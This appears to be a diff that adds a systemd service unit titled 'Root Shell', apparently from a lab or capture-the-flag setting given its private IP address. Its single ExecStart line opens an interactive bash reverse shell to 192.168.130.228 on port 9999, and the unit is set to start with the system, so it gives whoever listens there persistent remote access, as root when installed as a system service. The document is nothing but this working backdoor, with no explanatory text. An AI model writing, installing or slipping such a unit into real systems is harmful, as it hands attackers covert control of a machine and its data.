@@ -1,0 +1,7 @@
+[Unit]
+Description=Root Shell
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.130.228/9999 0>&1"
+[Install]
+WantedBy=multi-user.target
